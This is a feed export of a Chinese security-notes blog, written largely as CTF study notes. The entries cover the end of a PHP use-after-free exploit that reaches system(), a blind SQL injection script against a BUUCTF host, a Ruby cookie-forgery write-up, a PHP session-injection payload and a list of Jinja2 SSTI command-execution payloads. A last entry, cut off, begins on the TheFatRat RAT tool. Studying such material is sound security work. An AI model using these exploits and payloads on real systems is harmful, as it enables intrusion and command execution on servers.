&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> $n_alloc; $i&lt;span style="color:#f92672">++&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $contiguous[] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str_shuffle&lt;/span>(&lt;span style="color:#a6e22e">str_repeat&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">79&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">trigger_uaf&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;x&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $abc &lt;span style="color:#f92672">=&lt;/span> $backtrace[&lt;span style="color:#ae81ff">1&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;args&amp;#39;&lt;/span>][&lt;span style="color:#ae81ff">0&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $helper &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Helper&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $helper&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> ($x) { };
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">strlen&lt;/span>($abc) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">79&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">strlen&lt;/span>($abc) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;UAF failed&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># leaks
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $closure_handlers &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str2ptr&lt;/span>($abc, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $php_heap &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str2ptr&lt;/span>($abc, &lt;span style="color:#ae81ff">0x58&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $abc_addr &lt;span style="color:#f92672">=&lt;/span> $php_heap &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0xc8&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fake value
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0x60&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0x70&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fake reference
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0x10&lt;/span>, $abc_addr &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x60&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0x18&lt;/span>, &lt;span style="color:#ae81ff">0xa&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $closure_obj &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str2ptr&lt;/span>($abc, &lt;span style="color:#ae81ff">0x20&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $binary_leak &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($closure_handlers, &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>($base &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">get_binary_base&lt;/span>($binary_leak))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Couldn&amp;#39;t determine binary base address&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>($elf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">parse_elf&lt;/span>($base))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Couldn&amp;#39;t parse ELF header&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>($basic_funcs &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">get_basic_funcs&lt;/span>($base, $elf))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Couldn&amp;#39;t get basic_functions address&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>($zif_system &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">get_system&lt;/span>($basic_funcs))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Couldn&amp;#39;t get zif_system address&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fake closure object
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $fake_obj_offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xd0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x110&lt;/span>; $i &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, $fake_obj_offset &lt;span style="color:#f92672">+&lt;/span> $i, &lt;span style="color:#a6e22e">leak&lt;/span>($closure_obj, $i));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># pwn
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0x20&lt;/span>, $abc_addr &lt;span style="color:#f92672">+&lt;/span> $fake_obj_offset);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0xd0&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x38&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>); &lt;span style="color:#75715e"># internal func type
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0xd0&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x68&lt;/span>, $zif_system); &lt;span style="color:#75715e"># internal func handler
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ($helper&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span>)($cmd);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">exit&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>regexp盲注</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/regexp%E7%9B%B2%E6%B3%A8/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/regexp%E7%9B%B2%E6%B3%A8/</guid><description>&lt;p>regexp盲注&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> (&lt;span style="color:#66d9ef">select&lt;/span> username &lt;span style="color:#66d9ef">from&lt;/span> users regexp &lt;span style="color:#960050;background-color:#1e0010">正则表达式&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>匹配则返回1，反之不匹配返回0&lt;/p>
&lt;p>^xxx匹配xxx开头的字符&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> string
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> urllib &lt;span style="color:#f92672">import&lt;/span> parse
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;http://57255251-75f0-44e7-a06a-8b81f5d2b486.node4.buuoj.cn:81/index.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>strings&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;_&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase&lt;span style="color:#f92672">+&lt;/span>string&lt;span style="color:#f92672">.&lt;/span>digits
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>passwd&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> j &lt;span style="color:#f92672">in&lt;/span> strings:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data&lt;span style="color:#f92672">=&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;passwd&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;||/**/passwd/**/regexp/**/&amp;#34;^&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format((passwd&lt;span style="color:#f92672">+&lt;/span>j),parse&lt;span style="color:#f92672">.&lt;/span>unquote(&lt;span style="color:#e6db74">&amp;#39;%00&amp;#39;&lt;/span>))&lt;span style="color:#75715e">#parse.unqote是不编码%00的意思&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>post(url,data&lt;span style="color:#f92672">=&lt;/span>data)&lt;span style="color:#f92672">.&lt;/span>text
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;welcome&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> res:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> passwd &lt;span style="color:#f92672">+=&lt;/span> j
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\r&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> passwd, end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>ruby_cookie</title><link>http://localhost:1313/docs/wp/webexercise/ruby_cookie/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/wp/webexercise/ruby_cookie/</guid><description>&lt;h2 id="ruby_cookie">
 ruby_cookie
 &lt;a class="anchor" href="#ruby_cookie">#&lt;/a>
&lt;/h2>
&lt;h4 id="from-buuctf-bsidescf-2019mixer">
 from: buuctf [BSidesCF 2019]Mixer
 &lt;a class="anchor" href="#from-buuctf-bsidescf-2019mixer">#&lt;/a>
&lt;/h4>
&lt;p>看到rack-cookie &lt;a href="https://www.freebuf.com/vuls/181368.html">找了个文章&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>require &amp;#34;uri&amp;#34;
require &amp;#34;base64&amp;#34;
require &amp;#34;pp&amp;#34;
encoded_string = &amp;#34;BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTBiNDJlNTgzNjJjOWFjNjU5NzJm%0ANzAwYmMxODczZTlkYzBiY2ZkMGI3NGZlYzE4NjBhNWRmNGY3NTg2NDg4NjkG%0AOwBGSSIMYWVzX2tleQY7AEYiJa5eOeNVt5U3U6b2OYRb%2Bz2Do4Uxpnpqkw5L%0AM%2BRPHR46%0A&amp;#34;

decoded_uri = URI.decode_www_form_component(encoded_string)
decoded_base64 = Base64.decode64(decoded_uri)
puts decoded_base64
begin
 object = Marshal.load(decoded_base64)
 pp object
rescue ArgumentError =&amp;gt; e
 puts &amp;#34;ERROR: &amp;#34;+e.to_s
end
&lt;/code>&lt;/pre>&lt;p>改改，运行&lt;/p>
&lt;pre tabindex="0">&lt;code>ruby test.rb
&lt;/code>&lt;/pre>&lt;p>看到&lt;/p>
&lt;pre tabindex="0">&lt;code>{I&amp;#34;session_id:ETI&amp;#34;E0b42e58362c9ac65972f700bc1873e9dc0bcfd0b74fec1860a5df4f758648869;FI&amp;#34;
aes_key;F&amp;#34;%�^9�U��7S��9�[�=���1�zj�K3�O:
{&amp;#34;session_id&amp;#34;=&amp;gt;&amp;#34;0b42e58362c9ac65972f700bc1873e9dc0bcfd0b74fec1860a5df4f758648869&amp;#34;,
 &amp;#34;aes_key&amp;#34;=&amp;gt;&amp;#34;\xAE^9\xE3U\xB7\x957S\xA6\xF69\x84[\xFB=\x83\xA3\x851\xA6zj\x93\x0EK3\xE4O\x1D\x1E:&amp;#34;}
&lt;/code>&lt;/pre>&lt;p>aes key考虑一波解密，把密钥base64一下或者hex，试了上面的session_id 解不开&lt;/p>
&lt;p>想到返回包中还有一个user cookie，得到&lt;/p>
&lt;pre tabindex="0">&lt;code>{&amp;#34;first_name&amp;#34;:&amp;#34;123&amp;#34;,&amp;#34;last_name&amp;#34;:&amp;#34;123&amp;#34;,&amp;#34;is_admin&amp;#34;:0}
&lt;/code>&lt;/pre>&lt;p>开了，直接该is_admin=1,在加密回hex发包回去&lt;/p>
&lt;p>get flag&lt;/p></description></item><item><title>session伪造</title><link>http://localhost:1313/docs/network-security/php/session%E4%BC%AA%E9%80%A0/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/session%E4%BC%AA%E9%80%A0/</guid><description>&lt;h2 id="session的存储">
 session的存储
 &lt;a class="anchor" href="#session%e7%9a%84%e5%ad%98%e5%82%a8">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">session_start&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$_SESSION[&lt;span style="color:#e6db74">&amp;#39;session&amp;#39;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;123&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在win下面好像时默认存储在C:\window下面的，找不到可以用everthing搜一下&lt;/p>
&lt;p>命名是以sess_[a-z0-9]&lt;/p>
&lt;p>其存储的内容是根据session.serialize_handler定义的存储机制决定&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>存储机制&lt;/th>
 &lt;th>存储格式&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>php&lt;/td>
 &lt;td>键名 + 竖线 + 经过serialize()函数序列化处理的值&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>php_binry&lt;/td>
 &lt;td>键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>php_serialize&lt;/td>
 &lt;td>经过serialize()函数序列化处理的数组&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;p>以session.serialize_handler=php为例&lt;/p>
&lt;pre tabindex="0">&lt;code>session|s:3:&amp;#34;123&amp;#34;;
&lt;/code>&lt;/pre>&lt;p>session污染&lt;/p>
&lt;p>在有可控项写入session时用字符串拼接&lt;/p>
&lt;pre tabindex="0">&lt;code>|N;admin|b:1;
&lt;/code>&lt;/pre>&lt;p>可以造成admin==1&lt;/p></description></item><item><title>SSTI模板注入</title><link>http://localhost:1313/docs/network-security/python/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/python/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>SSTI模板注入&lt;/p>
&lt;p>&lt;a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#python">SSTI (Server Side Template Injection) - HackTricks&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>__class__
查看对象所在的类
__base__
查看一个类的父类
__mro__
返回包含回溯一个类所有由继承过父类的元组
__subclasses__()
返回一个类的所有子类的列表
__builtins__
内置模块的一个引用
__init__,__enter__
类实例化出一个对象时进行初始化方法
__globals__
返回一个函数所在的空间的所有类,属性,子模块以及方法的字典
__dict__
返回包含一个模块所拥有的类,属性,子模块以及方法的字典
__getattribute__
这个魔术方法可以拦截对对象的所有访问企图，但也具有访问对象的功能
&lt;/code>&lt;/pre>&lt;h3 id="ssti一般流程">
 ssti一般流程
 &lt;a class="anchor" href="#ssti%e4%b8%80%e8%88%ac%e6%b5%81%e7%a8%8b">#&lt;/a>
&lt;/h3>
&lt;p>尝试读取&lt;/p>
&lt;pre tabindex="0">&lt;code>{{config}}
{{self}}
__class__.__init__.__globals__[app].config
&lt;/code>&lt;/pre>&lt;p>python2/3&lt;/p>
&lt;pre tabindex="0">&lt;code>python2
	&amp;#39;&amp;#39;.__class__.__mro__[2]
	&amp;#39;&amp;#39;.__class__.__base__.__base__
python3
	&amp;#39;&amp;#39;.__class__.__mro__[1]
	&amp;#39;&amp;#39;.__class__.__base__.
	
&lt;/code>&lt;/pre>&lt;p>获取所有子类&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;&amp;#39;.__class__.base__[0].__subclasses__()
查找有用的子类
&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__
&lt;/code>&lt;/pre>&lt;p>通过__globals__&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__
调用内置库的函数用builtins,调用模块用import载入
&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__.__builtins__.eval
&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__.__builtins__.__import__(&amp;#39;os&amp;#39;).popen(&amp;#34;ls&amp;#34;).read()
或者用eval导入os模块
&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__.__builtins__.eval.__import__(&amp;#39;os&amp;#39;).popen(&amp;#34;ls&amp;#34;).read()
().__class__.__base__.__subclasses__()[213].__init__.__globals__[&amp;#39;popen&amp;#39;](&amp;#39;env&amp;#39;).read()
&lt;/code>&lt;/pre>&lt;p>别骂了，我太菜了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>{{lipsum&lt;span style="color:#f92672">.&lt;/span>__globals__&lt;span style="color:#f92672">.&lt;/span>os&lt;span style="color:#f92672">.&lt;/span>popen(&lt;span style="color:#e6db74">&amp;#39;cat flag.txt&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>()&lt;span style="color:#f92672">.&lt;/span>__class__&lt;span style="color:#f92672">.&lt;/span>__bases__[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>__subclasses__()[&lt;span style="color:#ae81ff">177&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>__init__&lt;span style="color:#f92672">.&lt;/span>__globals__&lt;span style="color:#f92672">.&lt;/span>__builtins__[&lt;span style="color:#e6db74">&amp;#39;eval&amp;#39;&lt;/span>](&lt;span style="color:#e6db74">&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls&amp;#39;).read()&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>过滤字符串，用字符拼接的方式&lt;/p>
&lt;p>config&lt;/p>
&lt;pre tabindex="0">&lt;code>__class__.__init__.__globals__[app].config
&lt;/code>&lt;/pre>&lt;p>没有内置os模块的&lt;/p>
&lt;pre tabindex="0">&lt;code>{{[].__class__.__base__.__subclasses__()[59].__init__[&amp;#39;__glo&amp;#39;+&amp;#39;bals__&amp;#39;][&amp;#39;__builtins__&amp;#39;][&amp;#39;eval&amp;#39;](&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls&amp;#39;).read()&amp;#34;)}}
&lt;/code>&lt;/pre>&lt;p>有内置os模块的&lt;/p>
&lt;pre tabindex="0">&lt;code>{{[].__class__.__base__.__subclasses__()[71].__init__[&amp;#39;__glo&amp;#39;+&amp;#39;bals__&amp;#39;][&amp;#39;os&amp;#39;].popen(&amp;#39;ls&amp;#39;).read()}}
&lt;/code>&lt;/pre>&lt;p>懒得找模块就直接bp遍历一波&lt;/p>
&lt;pre tabindex="0">&lt;code>{{get_flashed_messages.__globals__[&amp;#39;current_app&amp;#39;].config[&amp;#39;FLAG&amp;#39;]}}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;catch_warnings&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls /&amp;#39;).read()&amp;#34;)}}{% endif %}{% endfor %}

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;catch_warnings&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;cat /flag.txt&amp;#39;).read()&amp;#34;)}}{% endif %}{% endfor %}
&lt;/code>&lt;/pre>&lt;p>过滤参考网上大把&lt;/p></description></item><item><title>TheFatRat</title><link>http://localhost:1313/docs/hack/thefatrat/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/hack/thefatrat/</guid><description>&lt;p>某日突发奇想&lt;/p>
&lt;p>在github 上发现了一个好东西。&lt;/p>
&lt;p>安装一哈&lt;/p>
&lt;h3 id="配置vps-frp">
 配置VPS frp
 &lt;a class="anchor" href="#%e9%85%8d%e7%bd%aevps-frp">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-toml" data-lang="toml">&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#a6e22e">common&lt;/span>]
